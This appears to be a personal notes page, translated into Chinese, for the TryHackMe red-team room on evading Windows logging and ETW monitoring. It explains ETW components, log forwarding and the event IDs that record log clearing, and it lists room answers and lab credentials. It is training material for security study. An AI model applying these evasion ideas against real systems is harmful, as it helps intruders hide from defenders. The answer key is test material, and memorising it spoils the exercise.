<!doctype html>
<html lang="en" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-tryhackme/red-teaming/host-evasions/Evading Logging and Monitoring - 绕过日志记录和监控" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.7.0">
<title data-rh="true">Evading Logging and Monitoring - 绕过日志记录和监控 | PgDn&#x27;s Notes</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://pgup-code.github.io/PgUp-code.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://pgup-code.github.io/PgUp-code.github.io/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://pgup-code.github.io/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Evading Logging and Monitoring - 绕过日志记录和监控"><meta data-rh="true" property="og:locale" content="en"><meta data-rh="true" name="docusaurus_locale" content="en"><meta data-rh="true" name="docsearch:language" content="en"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="Evading Logging and Monitoring - 绕过日志记录和监控 | PgDn&#x27;s Notes"><meta data-rh="true" name="description" content="学习如何使用现代的工具无关方法绕过常见的日志记录和系统监控机制，例如ETW。"><meta data-rh="true" property="og:description" content="学习如何使用现代的工具无关方法绕过常见的日志记录和系统监控机制，例如ETW。"><link data-rh="true" rel="icon" href="/PgUp-code.github.io/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://pgup-code.github.io/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Evading Logging and Monitoring - 绕过日志记录和监控"><link data-rh="true" rel="alternate" href="https://pgup-code.github.io/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Evading Logging and Monitoring - 绕过日志记录和监控" hreflang="en"><link data-rh="true" rel="alternate" href="https://pgup-code.github.io/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Evading Logging and Monitoring - 绕过日志记录和监控" hreflang="x-default"><link rel="alternate" type="application/rss+xml" href="/PgUp-code.github.io/blog/rss.xml" title="PgDn&#39;s Notes RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/PgUp-code.github.io/blog/atom.xml" title="PgDn&#39;s Notes Atom Feed"><link rel="stylesheet" href="/PgUp-code.github.io/assets/css/styles.ebd0f903.css">
<script src="/PgUp-code.github.io/assets/js/runtime~main.005fc784.js" defer="defer"></script>
<script src="/PgUp-code.github.io/assets/js/main.770912a1.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<script>!function(){function t(t){document.documentElement.setAttribute("data-theme",t)}var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();t(null!==e?e:"light")}(),function(){try{const n=new URLSearchParams(window.location.search).entries();for(var[t,e]of n)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/PgUp-code.github.io/img/logo.svg"><div role="region" aria-label="Skip to main content"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">Skip to main content</a></div><nav aria-label="Main" class="navbar navbar--fixed-top"><div class="navbar__inner"><div class="navbar__items"><button aria-label="Toggle navigation bar" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/PgUp-code.github.io/"><div class="navbar__logo"><img src="/PgUp-code.github.io/img/logo.svg" alt="My Note Logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/PgUp-code.github.io/img/logo.svg" alt="My Note Logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate">PgDn Notes</b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/PgUp-code.github.io/docs/category/red-teaming---红队">TryHackMe</a><a class="navbar__item navbar__link" href="/PgUp-code.github.io/docs/category/docusaurus-备忘录">备忘录</a><a class="navbar__item navbar__link" href="/PgUp-code.github.io/blog">博客</a></div><div class="navbar__items navbar__items--right"><a href="https://github.com/PgUp-code/PgUp-code.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="Switch between dark and light mode (currently light mode)" aria-label="Switch between dark and light mode (currently light mode)" aria-live="polite" aria-pressed="false"><svg viewBox="0 0 24 24" width="24" height="24" class="lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" class="darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="Scroll back to top" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="Docs sidebar" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/PgUp-code.github.io/docs/category/red-teaming---红队">Red Teaming - 红队</a><button aria-label="Collapse sidebar category &#x27;Red Teaming - 红队&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/PgUp-code.github.io/docs/category/host-evasions---主机规避">Host Evasions - 主机规避</a><button aria-label="Collapse sidebar category &#x27;Host Evasions - 主机规避&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul style="display:block;overflow:visible;height:auto" class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Windows Internals - Windows 内部原理">Windows Internals - Windows 内部原理</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Introduction to Windows API - Windows API简介">Introduction to Windows API - Windows API简介</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Abusing Windows Internals - 滥用 Windows 内部机制">Abusing Windows Internals - 滥用 Windows 内部机制</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Introduction to Antivirus - 防病毒简介">Introduction to Antivirus - 防病毒简介</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/AV Evasion Shellcode - AV 绕过：Shellcode">AV Evasion Shellcode - AV 绕过：Shellcode</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Obfuscation Principles - 混淆原则">Obfuscation Principles - 混淆原则</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Signature Evasion - 签名规避">Signature Evasion - 签名规避</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Bypassing UAC - 绕过 UAC">Bypassing UAC - 绕过 UAC</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Runtime Detection Evasion - 运行时检测规避">Runtime Detection Evasion - 运行时检测规避</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Evading Logging and Monitoring - 绕过日志记录和监控">Evading Logging and Monitoring - 绕过日志记录和监控</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-3 menu__list-item"><a class="menu__link" tabindex="0" href="/PgUp-code.github.io/docs/tryhackme/red-teaming/host-evasions/Living Off the Land - 利用现成工具">Living Off the Land - 利用现成工具</a></li></ul></li></ul></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_VOVn"><div class="docItemContainer_Djhp"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="Breadcrumbs"><ul class="breadcrumbs" itemscope="" itemtype="https://schema.org/BreadcrumbList"><li class="breadcrumbs__item"><a aria-label="Home page" class="breadcrumbs__link" href="/PgUp-code.github.io/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/PgUp-code.github.io/docs/category/red-teaming---红队"><span itemprop="name">Red Teaming - 红队</span></a><meta itemprop="position" content="1"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item"><a class="breadcrumbs__link" itemprop="item" href="/PgUp-code.github.io/docs/category/host-evasions---主机规避"><span itemprop="name">Host Evasions - 主机规避</span></a><meta itemprop="position" content="2"></li><li itemscope="" itemprop="itemListElement" itemtype="https://schema.org/ListItem" class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link" itemprop="name">Evading Logging and Monitoring - 绕过日志记录和监控</span><meta itemprop="position" content="3"></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_ITEo"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">On this page</button></div><div class="theme-doc-markdown markdown"><header><h1>Evading Logging and Monitoring - 绕过日志记录和监控</h1></header><blockquote>
<p>学习如何使用现代的工具无关方法绕过常见的日志记录和系统监控机制，例如ETW。</p>
<p><a href="https://tryhackme.com/room/monitoringevasion" target="_blank" rel="noopener noreferrer">TryHackMe | Evading Logging and Monitoring</a></p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction---简介">Introduction - 简介<a href="#introduction---简介" class="hash-link" aria-label="Direct link to Introduction - 简介" title="Direct link to Introduction - 简介">​</a></h2>
<p>攻击者面临的最大障碍之一就是日志记录和监控。与防病毒和<strong>EDR</strong>（<strong>E</strong>ndpoint <strong>D</strong>etection and <strong>R</strong>esponse）解决方案不同，日志记录会创建活动的物理记录，这些记录可以用来分析恶意活动。</p>
<p>设备如何被监控将取决于环境和公司团队的偏好。有些团队可能决定根本不监控某些设备。通常，监控解决方案会从主机设备开始，收集应用程序或事件日志。一旦日志被创建，它们可以保存在设备上，或者发送到事件收集器/转发器。一旦日志离开设备，防御团队决定如何聚合它们；这通常通过使用索引器和<strong>SIEM</strong>（<strong>S</strong>ecurity <strong>I</strong>nformation and <strong>E</strong>vent <strong>M</strong>anager）来实现。</p>
<p><img decoding="async" loading="lazy" alt="Graph depicting data flow from device to event collecter/forwader to data indexer to a SIEM server" src="/PgUp-code.github.io/assets/images/5f73c10ed1fd5e7b28b2476d4cc6b375-2ce6593247dc85be869286238c2e91ea.png" width="651" height="81" class="img_ev3q"></p>
<p>攻击者一旦将日志从设备中取出，可能就无法控制它们，但可以控制设备上的内容及其如何被摄取。攻击者的主要目标是事件日志，这些日志由<strong>ETW</strong>（<strong>E</strong>vent <strong>T</strong>racing for <strong>W</strong>indows）管理和控制。</p>
<p>本节将讨论事件跟踪及其弱点，以便攻击者绕过或禁用基于ETW的解决方案。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="学习目标">学习目标<a href="#学习目标" class="hash-link" aria-label="Direct link to 学习目标" title="Direct link to 学习目标">​</a></h3>
<ul>
<li>了解事件跟踪的技术和实现。</li>
<li>了解如何创建技术来规避ETW。</li>
<li>学习如何将理论规避概念应用于代码。</li>
</ul>
<p>在开始本节之前，请熟悉基本的Windows使用和功能；我们推荐先完成<a href="https://tryhackme.com/room/windowsinternals" target="_blank" rel="noopener noreferrer">Windows Internals</a>课程。也推荐具备基本的C和PowerShell编程知识，但这不是必需的。</p>
<p>我们已经提供了一台基础的Windows机器，并且提供了完成本节所需的文件。你可以通过浏览器或RDP使用下面的凭证访问该机器。</p>
<p>Machine IP: <code>MACHINE_IP</code>       Username: <code>Administrator</code>       Password: <code>Tryhackme!</code></p>
<p>准备好迎接大量信息吧！请系好安全带，确保附近有灭火器，防止信息过载引起的意外！</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="event-tracing---事件追踪">Event Tracing - 事件追踪<a href="#event-tracing---事件追踪" class="hash-link" aria-label="Direct link to Event Tracing - 事件追踪" title="Direct link to Event Tracing - 事件追踪">​</a></h2>
<p>如前所述，几乎所有的事件日志功能都通过 ETW（事件追踪）在应用程序和内核级别处理。尽管 Windows 还提供了其他服务，如 <em>事件日志</em> 和 <em>跟踪日志</em>，这些要么是 ETW 的扩展，要么对攻击者的相关性较小。</p>
<table><thead><tr><th><strong>组件</strong></th><th><strong>目的</strong></th></tr></thead><tbody><tr><td>控制器</td><td>构建和配置会话</td></tr><tr><td>提供者</td><td>生成事件</td></tr><tr><td>消费者</td><td>解释事件</td></tr></tbody></table>
<p>我们将在接下来的任务中详细介绍每个组件以及如何进行仪器化。</p>
<div class="language-jsx codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-jsx codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token maybe-class-name">Event</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">ID</span><span class="token operator" style="color:#393A34">:</span><span class="token number" style="color:#36acaa">4624</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token literal-property property" style="color:#36acaa">Source</span><span class="token operator" style="color:#393A34">:</span><span class="token maybe-class-name">Security</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token literal-property property" style="color:#36acaa">Category</span><span class="token operator" style="color:#393A34">:</span><span class="token maybe-class-name">Logon</span><span class="token operator" style="color:#393A34">/</span><span class="token maybe-class-name">Logoff</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token literal-property property" style="color:#36acaa">Message</span><span class="token operator" style="color:#393A34">:</span><span class="token maybe-class-name">An</span><span class="token plain"> account was successfully logged on</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token literal-property property" style="color:#36acaa">Subject</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token maybe-class-name">Security</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">ID</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">NT</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">AUTHORITY</span><span class="token plain">\\</span><span class="token constant" style="color:#36acaa">SYSTEM</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token maybe-class-name">Account</span><span class="token plain"> </span><span class="token maybe-class-name">Name</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">WORKSTATION123</span><span class="token plain">$</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token spread operator" style="color:#393A34">...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> snip </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token spread operator" style="color:#393A34">...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token maybe-class-name">Logon</span><span class="token plain"> </span><span class="token maybe-class-name">Type</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">7</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token maybe-class-name">New</span><span class="token plain"> </span><span class="token maybe-class-name">Logon</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token maybe-class-name">Security</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">ID</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">CORPDOMAIN</span><span class="token plain">\\john</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">doe</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token maybe-class-name">Account</span><span class="token plain"> </span><span class="token maybe-class-name">Name</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> john</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">doe</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token spread operator" style="color:#393A34">...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"> snip </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token spread operator" style="color:#393A34">...</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token maybe-class-name">Process</span><span class="token plain"> </span><span class="token maybe-class-name">Information</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token maybe-class-name">Process</span><span class="token plain"> </span><span class="token constant" style="color:#36acaa">ID</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x314</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>有关事件日志的更多信息，请查看 <a href="https://tryhackme.com/room/windowseventlogs" target="_blank" rel="noopener noreferrer">Windows 事件日志任务</a>。</p>
<hr>
<p>到目前为止，我们了解了为什么日志会干扰攻击者，但 ETW 对攻击者到底有什么影响呢？ETW 可以监控操作系统的大部分内容，而日志一般只有有限的可见性或细节。</p>
<p>由于 ETW 的可见性，攻击者在执行操作时应始终留意可能触发的事件。对付 ETW 的最佳方法是尽量减少它对你所做操作的了解，同时保持环境的完整性。</p>
<p>在接下来的任务中，我们将介绍 ETW 仪器化、ETW 规避以及其他基于 ETW 的解决方案。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>ETW 组件中哪个会构建和配置会话？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Controllers</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>哪个事件 ID 记录了用户账户被删除的日志？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">4726</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="approaches-to-log-evasion---日志规避方法">Approaches to Log Evasion - 日志规避方法<a href="#approaches-to-log-evasion---日志规避方法" class="hash-link" aria-label="Direct link to Approaches to Log Evasion - 日志规避方法" title="Direct link to Approaches to Log Evasion - 日志规避方法">​</a></h2>
<p>在深入研究更现代和技术性的规避技巧之前，我们先来看一下可用的不同方法及其对攻击者和防御者的影响。</p>
<p>当首次考虑和评估日志规避时，你可能会认为仅仅销毁或篡改日志是可行的。</p>
<p>根据安全最佳实践，现代环境通常会采用日志转发。日志转发意味着SOC（安全运营中心）将从主机机器转移或“转发”日志到中央服务器或索引器。即使攻击者可以删除主机上的日志，这些日志可能已经被转移并得到保护。</p>
<p>假设攻击者销毁了所有日志（无论它们是否已经被转发），或者这些日志没有被转发，如何引发警报呢？攻击者必须首先考虑环境的完整性；如果设备上没有任何日志，这可能会引起严重怀疑并导致调查。即使攻击者控制了删除和转发哪些日志，防御者仍然可以跟踪篡改行为。</p>
<table><thead><tr><th><strong>事件ID</strong></th><th><strong>用途</strong></th></tr></thead><tbody><tr><td>1102</td><td>记录Windows安全审计日志何时被清除</td></tr><tr><td>104</td><td>记录日志文件何时被清除</td></tr><tr><td>1100</td><td>记录Windows事件日志服务何时被关闭</td></tr></tbody></table>
<p>上述事件ID可以监控销毁日志或“日志清除”的过程。这对攻击者试图篡改或销毁日志构成明显风险。尽管进一步规避这些防护措施或篡改日志是可能的，攻击者仍然需要评估风险。在接近环境时，通常无法得知安全实践，因此通过这种方法可能会带来<strong>OPSEC</strong>（操作安全）风险。</p>
<p>如果上述方法过于激进，我们该如何战略性地接近这个问题？</p>
<p>攻击者必须专注于恶意技术可能导致的日志，以保持环境的完整性。了解可能被监控的内容后，攻击者可以利用或修改已发布的方法。</p>
<p>大多数已发布的技术会针对ETW组件，因为这将允许攻击者对跟踪过程进行更多控制。</p>
<p>本课程将分析一些最常见的已发布技术和一种现代技术，它允许更广泛的控制。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>多少个事件可以用来追踪事件篡改？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">3</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" 